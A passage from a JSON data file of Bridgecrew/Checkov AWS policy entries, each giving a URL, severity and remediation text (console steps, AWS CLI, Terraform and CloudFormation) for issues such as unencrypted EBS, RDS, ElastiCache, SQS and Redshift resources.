        "description": "AWS EBS volumes are not encrypted\nDescription\nEncrypting EBS volumes ensures that replicated copies of your images are secure even if they are accidentally exposed. AWS EBS encryption uses AWS KMS customer master keys (CMK) when creating encrypted volumes and snapshots. Storing EBS volumes in their encrypted state reduces the risk of data exposure or data loss.\nWe recommend you encrypt all data stored in the EBS.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon EC2 console.\nFrom the navigation bar, select Region.\nFrom the navigation pane, select EC2 Dashboard.\nIn the upper-right corner of the page, select Account Attributes, then Settings.\nUnder EBS Storage, select Always encrypt new EBS volumes.\nClick Update.\n\nCLI Command\nTo always encrypt new EBS volumes, use the following command:\nBashaws ec2 --region <REGION> enable-ebs-encryption-by-default\n\nFix - Buildtime \nTerraform\n\nResource: aws_ebs_volume\nArgument: encrypted - (Optional) If true, the disk will be encrypted. \n\nGoresource \"aws_ebs_volume\" \"example\" {\n  ...\n  availability_zone = \"${var.availability_zone}\"\n+ encrypted         = true\n  ...\n}\n\nCloudFormation\n\nResource: AWS::EC2::Volume\nArgument: Properties.Encrypted - (Optional) If true, the disk will be encrypted. \n\nYAMLResources: \n  NewVolume:\n    Type: AWS::EC2::Volume\n    Properties: \n      ...\n+     Encrypted: true\n",
        "severity": "HIGH"
    },
    "CKV_AWS_16": {
        "url": "https://docs.bridgecrew.io/docs/general_4",
        "description": "AWS RDS DB cluster encryption is disabled \nDescription\nAWS RDS is a managed DB service enabling quick deployment and management of MySQL, MariaDB, PostgreSQL, Oracle, and Microsoft SQL Server DB engines. Native RDS encryption helps protect your cloud applications and fulfils compliance requirements for data-at-rest encryption.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon RDS console.\nClick Snapshots.\nSelect the snapshot that you want to encrypt.\nNavigate to Snapshot Actions, select Copy Snapshot.\nSelect the Destination Region, then enter your New DB Snapshot Identifier.\nSet Enable Encryption to Yes.\nSelect the Master Key from the list, then select Copy Snapshot.\n\nCLI Command\nIf you use the create-db-instance AWS CLI command to create an encrypted DB instance, set the --storage-encrypted parameter to true. If you use the CreateDBInstance API operation, set the StorageEncrypted parameter to true.\nShellaws rds create-db-instance \\\n    --db-instance-identifier test-mysql-instance \\\n    --db-instance-class db.t3.micro \\\n    --engine mysql \\\n    --master-username admin \\\n    --master-user-password secret99 \\\n    --allocated-storage 20\n    --storage-encrypted true\n\nFix - Buildtime \nTerraform\n\nResource: aws_db_instance\nArgument: storage_encrypted - Specifies whether the DB instance is encrypted.\n\naws_db_instanceresource \"aws_db_instance\" \"example\" {\n  ...\n  name                 = \"mydb\"\n+ storage_encrypted    = true \n}\n\nCloudFormation\n\nResource: AWS::RDS::DBInstance\nArgument: Properties.StorageEncrypted\n\nYAMLResources:\n  DB:\n    Type: 'AWS::RDS::DBInstance'\n    Properties:\n      ...\n+     StorageEncrypted: true\n",
        "severity": "HIGH"
    },
    "CKV_AWS_28": {
        "url": "https://docs.bridgecrew.io/docs/general_6",
        "description": "DynamoDB PITR is disabled\nDescription\nDynamoDB Point-In-Time Recovery (PITR) is an automatic backup service for DynamoDB table data that helps protect your DynamoDB tables from accidental write or delete operations. Once enabled, PITR provides continuous backups that can be controlled using various programmatic parameters. PITR can also be used to restore table data from any point in time during the last 35 days, as well as any incremental backups of DynamoDB tables.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon DynamoDB console.\nNavigate to the desired DynamoDB table, then select the Backups tab.\nTo turn the feature on, click Enable.\nThe Earliest restore date and Latest restore date are visible within a few seconds.\n\nCLI Command\nTo update continuous backup settings for a DynamoDB table:\nShellaws dynamodb update-continuous-backups \\\n    --table-name MusicCollection \\\n    --point-in-time-recovery-specification PointInTimeRecoveryEnabled=true\n\nFix - Buildtime \nTerraform\n\nResource: aws_dynamodb_table\nArgument: point_in_time_recovery - (Optional) Point-in-time recovery options. \n\nGoresource \"aws_dynamodb_table\" \"example\" {\n  ...\n  name           = \"GameScores\"\n+ point_in_time_recovery {\n+   enabled = true\n+  }\n  ...\n}\n\nCloudFormation / Serverless\n\nResource: AWS::DynamoDB::Table\nProperty: PointInTimeRecoverySpecification\n\nYAMLResources:\n    iotCatalog:\n      Type: AWS::DynamoDB::Table \n      Properties:\n        ...\n        PointInTimeRecoverySpecification:\n+         PointInTimeRecoveryEnabled: true\n",
        "severity": "HIGH"
    },
    "CKV_AWS_CUSTOM_3": {
        "url": "https://docs.bridgecrew.io/docs/general_7",
        "description": "Not all data stored in the EBS snapshot is securely encrypted\nDescription\nEBS snapshots must be encrypted, as they often include sensitive information, customer PII or CPNI.  Amazon EBS encryption uses AWS Key Management Service (AWS KMS) customer master keys (CMK) when creating encrypted volumes and snapshots. With EBS encryption enabled, you no longer have to build, maintain, and secure your own key management infrastructure.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon EC2 console.\nFrom the navigation bar, select Region.\nFrom the navigation pane, select EC2 Dashboard.\nIn the upper-right corner of the page, click Account Attributes, then EBS encryption.\nclick Manage.\nFor Default encryption key, select a symmetric customer managed CMK.\nClick Update EBS encryption.\n\nCLI Command\nTo enable EBS encryption by default:\nShellaws ec2 enable-ebs-encryption-by-default\n\nFix - Buildtime \nTerraform\n\nResource: aws_ebs_snapshot\nArgument: encrypted - Whether the snapshot is encrypted.\nExample fix:\n\naws_ebs_snapshotresource \"aws_ebs_snapshot\" \"example\" {\n  volume_id = \"${aws_ebs_volume.example.id}\"\n+ encrypted = true\n  ...\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_163": {
        "url": "https://docs.bridgecrew.io/docs/general_8",
        "description": "ECR image scan on push is not enabled\nDescription\nAmazon ECR is a fully managed container registry used to store, manage and deploy container images. ECR Image Scanning assesses and identifies operating system vulnerabilities. Using automated image scans you can ensure container image vulnerabilities are found before getting pushed to production. ECR APIs notify if vulnerabilities were found when a scan completes.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon ECR console.\nSelect a repository using the radio button.\nClick Edit.\nEnable the Scan on push toggle.\n\nCLI Command\nTo create a repository configured for scan on push:\nShellaws ecr create-repository\n--repository-name name\n--image-scanning-configuration scanOnPush=true\n--region us-east-2\n\nFix - Buildtime\nTerraform\n\nResource: aws_ecr_repository\nArgument: scan_on_push - (Required) Indicates whether images are scanned after being pushed to the repository (true) or not scanned (false). \n\naws_ecr_repository.foo.tfresource \"aws_ecr_repository\" \"example\" {\n  ...\n  image_tag_mutability = \"MUTABLE\"\n+  image_scanning_configuration {\n+    scan_on_push = true\n+  }\n  ...\n}\n\nCloudFormation\n\nResource: AWS::ECR::Repository\nArgument: Properties.ImageScanningConfiguration.ScanOnPush - (Required) Indicates whether images are scanned after being pushed to the repository (true) or not scanned (false). \n\nYAMLResources:\n  ImageScanTrue:\n    Type: AWS::ECR::Repository\n    Properties: \n      ...\n+     ImageScanningConfiguration:\n+       ScanOnPush: true\n",
        "severity": "HIGH"
    },
    "CKV_AWS_29": {
        "url": "https://docs.bridgecrew.io/docs/general_9",
        "description": "AWS ElastiCache Redis cluster with encryption for data at rest is disabled\nDescription\nElastiCache for Redis offers default encryption at rest as a service, as well as the ability to use your own symmetric customer-managed customer master keys in AWS Key Management Service (KMS).\nElastiCache for Redis at-rest encryption encrypts the following aspects:\n\nDisk during sync, backup and swap operations\nBackups stored in Amazon S3\n\nFix - Runtime \nElastiCache Console\nTo create a replication group using the ElastiCache console, make the following selections:\n\nEngine: redis.\nEngine version: 3.2.6, 4.0.10 or later.\nEncryption at-rest list: Yes.\n\nCLI Command\nThe following operation creates the Redis (cluster mode disabled) replication group my-classic-rg with three nodes (--num-cache-clusters), a primary and two read replicas. At-rest encryption is enabled for this replication group (--at-rest-encryption-enabled).\nShellaws elasticache create-replication-group \\\n    --replication-group-id my-classic-rg \\\n    --replication-group-description \"3 node replication group\" \\\n    --cache-node-type cache.m4.large \\\n    --engine redis \\\n    --engine-version 4.0.10 \\\n    --at-rest-encryption-enabled \\  \n    --num-cache-clusters 3 \\\n    --cache-parameter-group default.redis4.0\n\nFix - Buildtime \nTerraform\n\nResource: aws_elasticache_replication_group\nArgument: at_rest_encryption_enabled - (Optional) Whether to enable encryption at rest.\n\nGoresource \"aws_elasticache_replication_group\" \"default\"{\n  ...\n  replication_group_id          = \"default-1\"\n+ at_rest_encryption_enabled    = true\n  ...\n}\n\nCloudFormation\n\nResource: AWS::ElastiCache::ReplicationGroup\nArgument: AtRestEncryptionEnabled\n\nYAMLResources:\n    ReplicationGroup:\n    Type: 'AWS::ElastiCache::ReplicationGroup'\n    Properties:\n      ...\n+     AtRestEncryptionEnabled: True\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_30": {
        "url": "https://docs.bridgecrew.io/docs/general_10",
        "description": "AWS ElastiCache Redis cluster with in-transit encryption is disabled\nDescription\nElastiCache for Redis offers optional encryption in transit. In-transit encryption provides an additional layer of data protection when transferring data over standard HTTPS protocol. In-transit encryption can only be enabled on Redis replication groups at time of their creation.\nElastiCache for Redis in-transit encryption enables the following features:\n\nEncrypted connections: server and client connections are Secure Socket Layer (SSL) encrypted.\nEncrypted replication: data transfer between primary replicas is encrypted.\nServer authentication.\nClient authentication.\n\nFix - Runtime \nElastiCache Console\nTo create a replication group using the ElastiCache console, make the following selections:\n\nEngine: redis.\nEngine version: 3.2.6, 4.0.10 or later.\nEncryption in-transit list: Yes.\n\nCLI command\nThe parameters TransitEncryptionEnabled (CLI: --transit-encryption-enabled) are only available when using the CreateReplicationGroup (CLI: create-replication-group) operation.\nShellaws elasticache create-replication-group ^\n   --replication-group-id sample-repl-group ^\n   --replication-group-description \"Demo cluster with replicas\" ^\n   --num-cache-clusters 3 ^\n   --cache-node-type cache.m4.large ^\n   --cache-parameter-group default.redis3.2 ^\n   --engine redis ^\n   --engine-version 3.2.4\n   --transit-encryption-enabled\n\nFix - Buildtime \nTerraform \n\nResource: aws_elasticache_replication_group\nArgument: transit_encryption_enabled - (Optional) Whether to enable encryption in transit.\n\nGoresource \"aws_elasticache_replication_group\" \"example\"{\n  ...\n  replication_group_id          = \"default-1\"\n+ transit_encryption_enabled    = true\n  ...\n}\n\nCloudFormation \n\nResource: AWS::ElastiCache::ReplicationGroup\nArgument: Properties.TransitEncryptionEnabled - (Optional) Whether to enable encryption in transit.\n\nYAMLResources:\n    ReplicationGroup:\n    Type: 'AWS::ElastiCache::ReplicationGroup'\n    Properties:\n      ...\n+     TransitEncryptionEnabled: True\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_31": {
        "url": "https://docs.bridgecrew.io/docs/general_11",
        "description": "Data stored in the ElastiCache Replication Group is not securely encrypted in-transit\nDescription\nIn Amazon ElastiCache, the Redis authentication command asks users to enter a password prior to being granted permission to execute Redis commands on a password-protected server. Authentication can only be enabled when you are creating clusters with the in-transit encryption option enabled. When Redis authentication is enabled, users are required to pass through an additional layer of authentication before gaining access to the server and gaining permission to perform actions.\nWe recommend that all data stored in the ElastiCache Replication Group is securely encrypted in-transit with an authentication token.\nFix - Runtime \nProcedure\nTo authenticate a user using Redis AUTH create a new Redis Cluster with the following parameters enabled:\n\ntransit-encryption-enabled\nauth-token.\n\nCLI Command\nThe following AWS CLI operation modifies a replication group to rotate the AUTH token This-is-the-rotated-token.\nShellaws elasticache modify-replication-group \\\n--replication-group-id authtestgroup \\\n--auth-token This-is-the-rotated-token \\\n--auth-token-update-strategy ROTATE \\\n--apply-immediately\n\nFix - Buildtime \nTerraform\n\nResource: aws_elasticache_replication_group\nArgument: auth_token - (Optional) The password used to access a password protected server. Can be specified only if transit_encryption_enabled = true \n\nGoresource \"aws_elasticache_replication_group\" \"example\" {\n  ...\n  at_rest_encryption_enabled    = true\n+ auth_token                    = var.auth_token\n+ transit_encryption_enabled    = true\n  ...\n}\n\nCloudFormation\n\nResource: AWS::ElastiCache::ReplicationGroup\nArgument: AuthToken - (Optional) The password used to access a password protected server. Can be specified only if TransitEncryptionEnabled = true \n\nYAMLResources:\n    ReplicationGroup:\n    Type: 'AWS::ElastiCache::ReplicationGroup'\n    Properties:\n        ...\n+     AuthToken: 'MySecret!AuthToken$'\n+     TransitEncryptionEnabled: True\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_8": {
        "url": "https://docs.bridgecrew.io/docs/general_13",
        "description": "Launch configurations do not have encrypted EBS volumes\nDescription\nAmazon Elastic Block Store (EBS) volumes allow you to create encrypted launch configurations when creating EC2 instances and auto scaling. When the entire EBS volume is encrypted, data stored at rest on the volume, disk I/O, snapshots created from the volume, and data in-transit between EBS and EC2 are all encrypted.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon EC2 console.\nNavigate to Auto Scaling.\nCreate a new launch configuration.\nAdd an encrypted EBS volume (Add Storage).\n\nCLI Command\nShellaws autoscaling create-launch-configuration \n--launch-configuration-name my-launch-config\n--image-id ami-c6169af6\n--instance-type m1.medium\n--encrypted true\n\nFix - Buildtime \nTerraform\n\nResource: aws_launch_configuration\nAttribute: encrypted - (Optional) Whether the volume should be encrypted or not. Do not use this option if you are using snapshot_id as the encrypted flag will be determined by the snapshot. (Default: false). \n\nGoresource \"aws_launch_configuration\" \"example\" {\n  ...\n  instance_type = \"t2.micro\"\n+ root_block_device {\n+ encrypted     = true\n+ }\n  ...\n}\n\nCloudFormation\n\nResource: AWS::AutoScaling::LaunchConfiguration\nAttribute: Properties.BlockDeviceMappings \n\nYAMLAutoScalingConfig:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      ...\n      BlockDeviceMappings:\n      - DeviceName: \"/dev/sdk\"\n+       Ebs:\n          ...\n+         Encrypted: true\n      - DeviceName: \"/dev/sdf\"\n        Ebs:\n            ...\n-         Encrypted: false\n            - DeviceName: \"/dev/sdc\"\n-       VirtualName: ephermal\n",
        "severity": "HIGH"
    },
    "CKV_AWS_22": {
        "url": "https://docs.bridgecrew.io/docs/general_14",
        "description": "Data stored in SageMaker is not securely encrypted at rest\nDescription\nAmazon SageMaker enables you to pass a KMS key to SageMaker notebooks, securing the following resources:\n\nStorage volume\nProcessing jobs\nTraining jobs\nHyperparameter tuning jobs\nBatch transform jobs\nEndpoints\n\nBy applying encryption at-rest you ensure that the data stored on your AWS SageMaker notebook instances meet regulatory requirements and protect your SageMaker data at rest. \nFix - Runtime\nAWS Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon SageMaker console.\nSelect Notebook instances, then click Create Notebook Instance.\nOn the Create Notebook Instance page, provide the required information.\nThe Encryption key lets you encrypt data on the ML storage volume attached to the notebook instance using an AWS Key Management Service (AWS KMS) key. If you plan to store sensitive information on the ML storage volume, consider encrypting the information.\n\nCLI Command\nTo create a SageMaker notebook instance:\nShellcreate-notebook-instance\n--notebook-instance-name <value>\n--instance-type <value>\n--kms-key-id <value>\n\nFix - Buildtime \nTerraform\n\nResource: aws_sagemaker_notebook_instance\nAttribute: kms_key_id - (Optional) The AWS Key Management Service (AWS KMS) key that Amazon SageMaker uses to encrypt the model artifacts at rest using Amazon S3 server-side encryption. \n\nGoresource \"aws_sagemaker_notebook_instance\" \"example\" {\n  ...\n  name          = \"my-notebook-instance\"\n+ kms_key_id    = <value>\n  ...\n}\n",
        "severity": "HIGH"
    },
    "CKV_AWS_26": {
        "url": "https://docs.bridgecrew.io/docs/general_15",
        "description": "AWS SNS topic has SSE disabled\nDescription\nAmazon SNS is a publishers and subscribers messaging service. When you publish messages to encrypted topics, customer master keys (CMK), powered by AWS KMS, can be used to encrypt your messages.\nIf you operate in a regulated market, such as HIPAA for healthcare, PCI DSS for finance, or FedRAMP for government, you need to ensure sensitive data messages passed in this service are encrypted at rest. \nFix - Runtime\nSNS Console\n\nNavigate to the SNS console in AWS and select Topics on the left.\nOpen a topic.\nIn the top-right corner, click Edit.\nUnder Encryption, select Enable encryption.\nSelect a customer master key - you can use the default AWS key or a custom key in KMS.\n\nCLI Command\naws sns set-topic-attributes \n--topic-arn <TOPIC_ARN> \n--attribute-name \"KmsMasterKeyId\" \n--attribute-value <KEY>\n\nThe ARN format is arn:aws:sns:REGION:ACCOUNTID:TOPIC_NAME\nThe key is a reference to a KMS key or alias. Use alias/aws/sns for the default AWS key.\nFix - Buildtime\nTerraform\n\nResource: aws_sns_topic\nArgument: kms_master_key_id - (Optional) The ID of an AWS-managed customer master key (CMK) for Amazon SNS or a custom CMK. \n\nGoresource \"aws_sns_topic\" \"example\" {\n  ...\n  name              = \"user-updates-topic\"\n+ kms_master_key_id = \"alias/aws/sns\"\n}\n\nCloudFormation\n\nResource: AWS::SNS::Topic\nArgument: Properties.KmsMasterKeyId\n\nYAMLType: AWS::SNS::Topic\n    Properties:\n      ...\n+     KmsMasterKeyId: \"kms_id\"\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_27": {
        "url": "https://docs.bridgecrew.io/docs/general_16-encrypt-sqs-queue",
        "description": "AWS SQS server side encryption is not enabled\nDescription\nAmazon Simple Queue Service (SQS) provides the ability to encrypt queues so sensitive data is passed securely. It uses server-side-encrypyion (SSE) and supports AWS-managed Customer Master Key (CMK), as well as self-created/self-managed keys. SSE encrypts only the body of the message, with queue metadata and message metadata out of scope, and backlogged messages not encrypted. \nIf you operate in a regulated market, such as HIPAA for healthcare, PCI DSS for finance, or FedRAMP for government, you need to ensure sensitive data messages passed in this service are encrypted at rest.\nWe recommend you encrypt Data Queued using SQS.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon SQS console.\nOpen a Queue and click Edit at the top right.\nExpand Encryption and select Enabled.\nSelect or enter a CMK key, or use the default provided by AWS.\n\nCLI Command\naws sqs set-queue-attributes --queue-url <QUEUE_URL> --attributes KmsMasterKeyId=<KEY>\n\nThe format of the queue URL is https://sqs.REGION.amazonaws.com/ACCOUNT_ID/QUEUE_NAME\nThe key should be a KMS key or alias. The default AWS key is alias/aws/sqs.\nFix - Buildtime \nTerraform\n\nResource: aws_sqs_queue\nArguments:\nkms_master_key_id - (Optional) The ID of an AWS-managed customer master key (CMK) for Amazon SQS or a custom CMK.\nkms_data_key_reuse_period_seconds - (Optional) The length of time, in seconds, for which Amazon SQS can reuse a data key to encrypt or decrypt messages before calling AWS KMS again. An integer representing seconds, between 60 seconds (1 minute) and 86,400 seconds (24 hours). The default is 300 (5 minutes).\n\naws_sqs_queue.terraform_queue.tfresource \"aws_sqs_queue\" \"example\" {\n  name                              = \"terraform-example-queue\"\n+ kms_master_key_id                 = \"alias/aws/sqs\"\n+ kms_data_key_reuse_period_seconds = 300\n  ...\n}\n\nCloudFormation\n\nResource: AWS::SQS::Queue\nArguments: Properties.KmsMasterKeyId\n\nYAMLType: AWS::SQS::Queue\n    Properties:\n      ...\n+     KmsMasterKeyId: \"kms_id\"\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_44": {
        "url": "https://docs.bridgecrew.io/docs/general_18",
        "description": "Neptune storage is not securely encrypted\nDescription\nAmazon Neptune is a fully managed graph database service for building and running applications that work with connected datasets. Neptune supports graph query languages such as Apache TinkerPop Gremlin and W3C\u2019s SPARQL.  Neptune also supports recommendation engines, fraud detection, knowledge graphs, drug discovery, and network security.\nEncryption of Neptune storage protects data and metadata against unauthorized access. It also fulfils compliance requirements for data-at-rest encryption of production file systems. Encryption for an existing database cannot be added or changed after it is created.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon Neptune console.\nTo start the Launch DB instance wizard, click Launch DB Instance. \nTo customize the settings for your Neptune DB cluster, navigate to the Specify DB details page.\nTo enable encryption for a new Neptune DB instance, navigate to the Enable encryption section on the Neptune console and click Yes.\n\nCLI Command\nTo creates a new Amazon Neptune DB cluster:\nShellcreate-db-cluster\n    --db-cluster-identifier <value>\n    --engine <value>\n    --storage-encrypted true\n\nFix - Buildtime \nTerraform \n\nResource: aws_neptune_cluster\nArguments: storage_encrypted - (Optional) Specifies whether the Neptune cluster is encrypted. The default is false if not specified.\n\naws_neptune_clusterresource \"aws_neptune_cluster\" \"example\" {\n  ...\n  cluster_identifier                  = \"neptune-cluster-demo\"\n+ storage_encrypted                   = true\n  ...\n}\n\nCloudFormation \n\nResource: AWS::Neptune::DBCluster\nArguments: Proprties.StorageEncrypted\n\nYAMLType: \"AWS::Neptune::DBCluster\"\n    Properties:\n      ...\n+     StorageEncrypted: true\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_43": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_22",
        "description": "AWS Kinesis streams are not encrypted using SSE\nDescription\nAmazon Kinesis Data Firehose is a streaming data pipeline service that can route messages to destinations such as S3, Redshift Elasticsearch and others. It can also be used to transform data properties before streaming to a defined destination. \nKinesis enables server-side data encryption if the data stream contains sensitive information. When sending data from a producer to a data stream Kinesis encrypts the data using an AWS KMS key before storing the data at rest. \nWe recommend you ensure Kinesis streams are encrypted using server-side encryption (SSE).\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nSelect Services  and search for Kinesis.\nUnder the Amazon Kinesis dashboard select Data Firehose from the left navigation panel.\nSelect the Firehose Delivery System that needs to be verified and click on the Name to access the delivery stream.\nSelect the Details tab and scroll down to Amazon S3 destination. Check the Encryption value and if it's set to Disabled then the selected Firehose Delivery System data is not encrypted.\nRepeat steps 4 and 5 to verify another Firehose Delivery System.\nTo enable the Encryption on selected Firehose Delivery System click on the Name to access the delivery stream. Under the Details tab, click Edit to make the changes in Amazon S3 destination.\nClick Enable next to the S3 encryption to enable the encryption.\nSelect the KMS master key from the dropdown list. Select the (Default( aws/s3 )) KMS key or an AWS KMS Customer Master Key (CMK).\nClick Save .\nA Successfully Updated message appears.\n\nCLI Command\nEnables or updates server-side encryption using an AWS KMS key for a specified stream.\nShellaws kinesis start-stream-encryption \\\n    --encryption-type KMS \\\n    --key-id arn:aws:kms:us-west-2:012345678912:key/a3c4a7cd-728b-45dd-b334-4d3eb496e452 \\\n    --stream-name samplestream\n\nFix - Buildtime \nTerraform\n\nResource: aws_kinesis_stream\nArguments:\nencryption_type - (Optional) The encryption type to use. The only acceptable values are NONE or KMS. The default value is NONE.\nkms_key_id - (Optional) The GUID for the customer-managed KMS key to use for encryption. You can also use a Kinesis-owned master key by specifying the alias alias/aws/kinesis.\n\nGoresource \"aws_kinesis_stream\" \"test_stream\" {\n  ...\n  name             = \"terraform-kinesis-test\"\n + encryption_type = KMS\n + kms_key_id = <value>\n  ...\n }\n\nCloudFormation\n\nResource: AWS::Kinesis::Stream\nArguments: Properties.StreamEncryption.EncryptionType\n\nYAMLResources:\n  KMSEncryption:\n      Type: AWS::Kinesis::Stream\n      Properties:\n          ...\n          StreamEncryption:\n             ...\n             EncryptionType: KMS\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_47": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_23",
        "description": "DAX is not securely encrypted at rest\nDescription\nAmazon DynamoDB Accelerator (DAX) encryption at rest provides an additional layer of data protection, helping secure your data from unauthorized access to underlying storage.\nWith encryption at rest the data persisted by DAX on disk is encrypted using 256-bit Advanced Encryption Standard (AES-256). DAX writes data to disk as part of propagating changes from the primary node to read replicas. DAX encryption at rest automatically integrates with AWS KMS for managing the single service default key used to encrypt clusters. \nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon DynamoDB console.\nIn the navigation pane on the left side of the console, under DAX, select Clusters.\nClick Create Cluster.\nFor Cluster name, enter a short name for your cluster. Select the node type for all of the nodes in the cluster, and for the cluster size, use 3 nodes.\nIn Encryption, make sure that Enable encryption is selected.\n7 After selecting the IAM role, subnet group, security groups, and cluster settings, select Launch cluster.\n\nCLI Command\nTo creates a DAX cluster:\nShellaws dax create-cluster \\\n    --cluster-name daxcluster \\\n    --node-type dax.r4.large \\\n    --replication-factor 3 \\\n    --iam-role-arn roleARN  \\\n    --sse-specification Enabled=true\n\nFix - Buildtime \nTerraform\n\nResource: aws_dax_cluster\nArguments: server_side_encryption - (Optional) Encrypt at rest options, enabled/disabled. \n\nGoresource \"aws_dax_cluster\" \"example\" {\n  ...\n  cluster_name       = \"cluster-example\"\n+ server_side_encryption = enabled\n  ...\n}\n\nCloudFormation\n\nResource: AWS::DAX::Cluster\nArguments: Properties.SSESpecification.SSEEnabled - (Optional) Encrypt at rest options, enabled/disabled. \n\nYAMLResources:\n  daxCluster:\n    Type: AWS::DAX::Cluster\n    Properties:\n      ...\n+     SSESpecification:\n+       SSEEnabled: true\n",
        "severity": "HIGH"
    },
    "CKV_AWS_51": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_24",
        "description": "ECR image tags are not immutable\nDescription\nAmazon ECR supports immutable tags, preventing image tags from being overwritten. In the past, ECR tags could have been overwritten, this could be overcome by requiring users to uniquely identify an image using a naming convention.   \nTag Immutability enables users can rely on the descriptive tags of an image as a mechanism to track and uniquely identify images. By setting an image tag as immutable, developers can use the tag to correlate the deployed image version with the build that produced the image.  \nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon ECR console.\nSelect a repository using the radio button.\nClick Edit.\nEnable the Tag immutability toggle.\n\nCLI Command\nTo create a repository with immutable tags configured:\nShellaws ecr create-repository\n--repository-name name\n--image-tag-mutability IMMUTABLE\n--region us-east-2\n\nFix - Buildtime \nTerraform\n\nResource: aws_ecr_repository\nArguments: image_tag_mutability - (Optional) The tag mutability setting for the repository. Must be one of: MUTABLE or IMMUTABLE. Defaults to MUTABLE. \n\nGoresource \"aws_ecr_repository\" \"example\" {\n  ...\n  name                 = \"bar\"\n+ image_tag_mutability = \"IMMUTABLE\"\n}\n\nCloudFormation\n\nResource: AWS::ECR::Repository\nArguments: Properties.ImageTagMutability - (Optional) The tag mutability setting for the repository. Must be one of: MUTABLE or IMMUTABLE. Defaults to MUTABLE. \n\nYAMLResources: \n  MyRepository: \n    Type: AWS::ECR::Repository\n    Properties: \n      ...\n+     ImageTagMutability: \"IMMUTABLE\"\n",
        "severity": "LOW"
    },
    "CKV_AWS_64": {
        "url": "https://docs.bridgecrew.io/docs/general_25",
        "description": "AWS Redshift cluster not encrypted\nDescription\nWe recommend all data stored in the Redshift cluster is securely encrypted at rest, you can create new encrypted clusters or enable CMK encryption on existing clusters, as AWS says \"You can enable encryption when you launch your cluster, or you can modify an unencrypted cluster to use AWS Key Management Service (AWS KMS) encryption\"\nhttps://docs.aws.amazon.com/redshift/latest/mgmt/working-with-db-encryption.html\nFix - Buildtime \nTerraform \n\nResource:  aws_redshift_cluster\nArgument: encrypted, ensure that this argument is set to true to protect this database. \n\nThis change may recreate your cluster.\naws_redshift_cluster.redshift.tfresource \"aws_redshift_cluster\" \"redshift\" {\n  ...\n  cluster_identifier        = \"shifty\"\n+ encrypted                 = true\n  kms_key_id                = var.kms_key_id\n  ...\n}\n\nCloudFormation \n\nResource:  AWS::Redshift::Cluster\nArgument: Properties.Encrypted\n\nYAMLType: \"AWS::Redshift::Cluster\"\n    Properties:\n      ...\n+     Encrypted: true\n",
        "severity": "HIGH"
    },
    "CKV_AWS_71": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_12",
        "description": "AWS Redshift database does not have audit logging enabled\nDescription\nAmazon Redshift logs information about connections and user activities in your database. These logs help you to monitor the database for security and troubleshooting purposes, a process often referred to as database auditing. The logs are stored in Amazon S3 buckets. These provide convenient access with data security features for users who are responsible for monitoring activities in the database.\nEnabling S3 bucket logging on Redshift databases allows you to capture all events which may affect the database, this is useful in security and incident response workflows. \nFix - Runtime \nAWS Console\nTo enable Redshift to S3 bucket logging using the AWS Management Console, follow these steps: \n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon Redshift console.\nOn the navigation menu, choose Clusters, then choose the cluster that you want to update.\nChoose the Maintenance and Monitoring tab. Then view the Audit logging section.\nChoose Edit tab.\nOn the Configure audit logging page, choose to Enable audit logging and enter your choices regarding where the logs are stored.\nClick Confirm.\n\nFix - Buildtime \nTerraform\n\nResource: aws_redshift_cluster\nArgument: logging/enable is set to true.\nAn example terraform definition of an Amazon Redshift database with logging enabled, resolving the violation:\n\nGoresource \"aws_redshift_cluster\" \"default\" {\n    ...\n    cluster_type       = \"single-node\"\n+   logging {\n+     enable = \"true\"\n+   }\n  }\n\nCloudFormation\n\nResource: AWS::Redshift::Cluster\nArgument: Properties.BucketName\n\nYAMLType: \"AWS::Redshift::Cluster\"\n    Properties:\n      ...\n+     LoggingProperties:\n+       BucketName: \"your_bucket\"\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_5": {
        "url": "https://docs.bridgecrew.io/docs/elasticsearch_3-enable-encryptionatrest",
